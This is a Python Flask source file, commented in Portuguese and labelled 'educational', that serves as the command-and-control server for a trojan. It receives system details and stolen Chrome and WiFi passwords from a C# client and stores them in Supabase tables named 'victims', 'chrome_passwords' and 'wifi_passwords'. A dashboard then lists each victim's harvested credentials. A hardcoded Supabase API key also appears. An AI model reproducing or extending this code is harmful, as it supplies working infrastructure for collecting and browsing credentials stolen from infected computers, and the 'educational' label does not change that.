"""
============================================
  PAINEL DE CONTROLE - Servidor Web
  Versão educacional - Engenharia de Software
  
  Recebe dados do client C# e salva no Supabase.
  Dashboard no navegador para visualizar tudo.
============================================
"""

import os
import json
import datetime
from flask import Flask, render_template, request, jsonify
import requests
import threading

app = Flask(__name__)
app.secret_key = 'trojan_educacional_key'

# ============================================
# CONFIGURACAO SUPABASE
# ============================================
SUPABASE_URL = "https://idtvtmyxsvdpcptwjglc.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlkdHZ0bXl4c3ZkcGNwdHdqZ2xjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ4NTE1NjUsImV4cCI6MjEwMDQyNzU2NX0.c8jtx3UR11IAbOWEWz7ij5Kb-K4IH3MjjtmLIUE8xno"

# Headers para requisições ao Supabase
SUPABASE_HEADERS = {
    'apikey': SUPABASE_KEY,
    'Authorization': f'Bearer {SUPABASE_KEY}',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation'
}


# ============================================
# FUNCOES SUPABASE
# ============================================
def save_to_supabase(data, ip_address):
    """Salva dados da vítima no Supabase."""
    sys_info = data.get('system_info', {})
    hostname = sys_info.get('hostname', data.get('hostname', 'unknown'))
    now = datetime.datetime.utcnow().isoformat()

    # 1. Salvar vítima na tabela victims
    victim_payload = {
        'hostname': hostname,
        'ip_address': ip_address,
        'timestamp': now,
        'os_info': sys_info.get('os', ''),
        'username': sys_info.get('username', ''),
        'architecture': sys_info.get('architecture', ''),
        'processors': str(sys_info.get('processors', '')),
        'public_ip': sys_info.get('public_ip', ''),
        'disks_info': json.dumps(sys_info.get('disks', [])),
        'network_info': json.dumps(sys_info.get('network_interfaces', [])),
        'software_list': json.dumps(sys_info.get('installed_software', []))
    }

    response = requests.post(
        f'{SUPABASE_URL}/rest/v1/victims',
        headers=SUPABASE_HEADERS,
        json=victim_payload
    )

    if response.status_code not in (200, 201):
        print(f"[!] Erro ao salvar vítima: {response.status_code} - {response.text}")
        return None

    victim_data = response.json()
    victim_id = victim_data[0]['id'] if victim_data else None
    print(f"[+] Vítima salva: {hostname} (id: {victim_id})")

    # 2. Salvar senhas Chrome
    chrome_pw = data.get('chrome_passwords', '')
    if chrome_pw:
        chrome_payload = {
            'victim_id': victim_id,
            'hostname': hostname,
            'password_data': chrome_pw,
            'timestamp': now
        }
        resp = requests.post(
            f'{SUPABASE_URL}/rest/v1/chrome_passwords',
            headers=SUPABASE_HEADERS,
            json=chrome_payload
        )
        if resp.status_code in (200, 201):
            print(f"[+] Senhas Chrome salvas para {hostname}")
        else:
            print(f"[!] Erro ao salvar Chrome: {resp.status_code}")

    # 3. Salvar senhas WiFi
    wifi_pw = data.get('wifi_passwords', '')
    if wifi_pw:
        wifi_payload = {
            'victim_id': victim_id,
            'hostname': hostname,
            'password_data': wifi_pw,
            'timestamp': now
        }
        resp = requests.post(
            f'{SUPABASE_URL}/rest/v1/wifi_passwords',
            headers=SUPABASE_HEADERS,
            json=wifi_payload
        )
        if resp.status_code in (200, 201):
            print(f"[+] Senhas WiFi salvas para {hostname}")
        else:
            print(f"[!] Erro ao salvar WiFi: {resp.status_code}")

    return victim_id


def get_all_victims():
    """Busca todas as vítimas no Supabase."""
    response = requests.get(
        f'{SUPABASE_URL}/rest/v1/victims',
        headers={**SUPABASE_HEADERS, 'Prefer': 'return=representation'},
        params={'select': '*', 'order': 'timestamp.desc'}
    )
    if response.status_code == 200:
        return response.json()
    return []


def get_victim_details(victim_id):
    """Busca detalhes de uma vítima específica."""
    # Dados da vítima
    response = requests.get(
        f'{SUPABASE_URL}/rest/v1/victims',
        headers=SUPABASE_HEADERS,
        params={'id': f'eq.{victim_id}'}
    )
    if response.status_code != 200 or not response.json():
        return None

    victim = response.json()[0]

    # Senhas Chrome
    chrome_resp = requests.get(
        f'{SUPABASE_URL}/rest/v1/chrome_passwords',
        headers=SUPABASE_HEADERS,
        params={'victim_id': f'eq.{victim_id}'}
    )
    chrome_pw = ''
    if chrome_resp.status_code == 200 and chrome_resp.json():
        chrome_pw = chrome_resp.json()[0].get('password_data', '')

    # Senhas WiFi
    wifi_resp = requests.get(
        f'{SUPABASE_URL}/rest/v1/wifi_passwords',
        headers=SUPABASE_HEADERS,
        params={'victim_id': f'eq.{victim_id}'}
    )
    wifi_pw = ''
    if wifi_resp.status_code == 200 and wifi_resp.json():
        wifi_pw = wifi_resp.json()[0].get('password_data', '')

    return {
        'system_info': {
            'hostname': victim.get('hostname'),
            'username': victim.get('username'),
            'os': victim.get('os_info'),
            'architecture': victim.get('architecture'),
            'processors': victim.get('processors'),
            'public_ip': victim.get('public_ip'),
            'ip_address': victim.get('ip_address'),
            'timestamp': victim.get('timestamp'),
        },
        'chrome_passwords': chrome_pw,
        'wifi_passwords': wifi_pw
    }


# ============================================
# API - Recebe dados do client
# ============================================
@app.route('/api/data', methods=['POST'])
def receive_data():
    """Recebe dados enviados pelo client C# e salva no Supabase."""
    try:
        data = request.get_json()
        ip_address = request.remote_addr

        # Salva no Supabase em thread separada
        thread = threading.Thread(
            target=save_to_supabase,
            args=(data, ip_address)
        )
        thread.start()

        hostname = data.get('system_info', {}).get('hostname', data.get('hostname', 'unknown'))
        print(f"[+] Dados recebidos de: {hostname} ({ip_address})")
        return jsonify({'status': 'ok', 'message': 'Dados recebidos com sucesso'})

    except Exception as e:
        print(f"[!] Erro ao processar dados: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


# ============================================
# API - Ping do client
# ============================================
@app.route('/api/ping', methods=['GET'])
def ping():
    """Client verifica se o servidor está online."""
    return jsonify({'status': 'online', 'time': datetime.datetime.utcnow().isoformat()})


# ============================================
# DASHBOARD
# ============================================
@app.route('/')
def dashboard():
    """Página principal com o painel de controle."""
    return render_template('index.html')


# ============================================
# API - Lista vítimas (do Supabase)
# ============================================
@app.route('/api/victims', methods=['GET'])
def list_victims():
    """Retorna lista de vítimas do Supabase."""
    try:
        victims = get_all_victims()
        victim_list = []
        for v in victims:
            # Verifica se tem senhas
            has_chrome = requests.get(
                f'{SUPABASE_URL}/rest/v1/chrome_passwords',
                headers=SUPABASE_HEADERS,
                params={'victim_id': f'eq.{v["id"]}', 'select': 'id'}
            )
            has_wifi = requests.get(
                f'{SUPABASE_URL}/rest/v1/wifi_passwords',
                headers=SUPABASE_HEADERS,
                params={'victim_id': f'eq.{v["id"]}', 'select': 'id'}
            )

            victim_list.append({
                'id': v['id'],
                'hostname': v.get('hostname', 'unknown'),
                'timestamp': v.get('timestamp', ''),
                'ip': v.get('ip_address', ''),
                'public_ip': v.get('public_ip', ''),
                'has_chrome_pw': has_chrome.status_code == 200 and len(has_chrome.json()) > 0,
                'has_wifi_pw': has_wifi.status_code == 200 and len(has_wifi.json()) > 0
            })
        return jsonify({'victims': victim_list})

    except Exception as e:
        print(f"[!] Erro ao listar vítimas: {e}")
        return jsonify({'victims': []})


# ============================================
# API - Detalhes de uma vítima
# ============================================
@app.route('/api/victim/<victim_id>', methods=['GET'])
def victim_details(victim_id):
    """Retorna detalhes de uma vítima específica."""
    try:
        details = get_victim_details(victim_id)
        if details:
            return jsonify(details)
        else:
            return jsonify({'error': 'Vitima nao encontrada'}), 404
    except Exception as e:
        print(f"[!] Erro ao buscar detalhes: {e}")
        return jsonify({'error': str(e)}), 500


# ============================================
# INICIAR
# ============================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("=" * 50)
    print("  PAINEL DE CONTROLE")
    print("=" * 50)
    print(f"[+] Servidor rodando em: http://0.0.0.0:{port}")
    print(f"[+] Dashboard: http://localhost:{port}")
    print(f"[+] Supabase: {SUPABASE_URL}")
    print(f"[+] Client envia para: http://SEU_URL:{port}/api/data")
    print("=" * 50)
    print()

    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
